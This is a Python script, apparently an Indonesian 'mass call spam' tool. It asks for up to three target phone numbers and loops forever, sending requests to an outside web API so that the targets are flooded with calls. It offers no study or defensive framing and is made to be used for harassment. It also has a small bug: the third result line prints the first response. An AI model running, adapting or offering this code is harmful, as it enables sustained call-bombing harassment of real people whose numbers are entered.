#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by KANG-NEWBIE
"""
ngapai bosq? mau recode?
tinggal pake aja susah amat sih?!
"""

try:
	import os
	import subprocess as sp
	os.system('clear')
	print("\033[1;33m[!] Please Wait...")
	sp.call('pip install requests', shell=True, stdout=sp.DEVNULL, stderr=sp.STDOUT)
	import requests
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

try:
	os.system('clear')
	print("""\033[1;32m
   _  _     \033[1;36mSPAM CALL MASSAL NONSTOP\033[1;32m
 _| || |_   \033[1;31mCODED BY : KANG-NEWBIE\033[1;32m
|_  ..  _|  \033[1;31mContact : https://t.me/kang_nuubi\033[1;32m
|_      _|  \033[1;31mgithub : https://github.com/KANG-NRWBIE\033[1;32m
  |_||_|    \033[1;33mCTRL + C Untuk Stop\033[32m
""")
	print("[*] Klik ENTER untuk melewati step")
	no = input("[?] INPUT NO TARGET 1 : ")
	no1 = input("[?] INPUT NO TARGET 2 : ")
	no2 = input("[?] INPUT NO TARGET 3 : ")
	print()
	print("[-] RESULT:")

	while True:
		r = requests.get('https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor='+no)
		print("[+] Target 1",r.json()["msg"])
		r1 = requests.get('https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor='+no1)
		print("[+] Target 2",r1.json()["msg"])
		r2 = requests.get('https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor='+no2)
		print("[+] Target 3",r.json()["msg"])
except KeyboardInterrupt:
	exit("\nBye...")
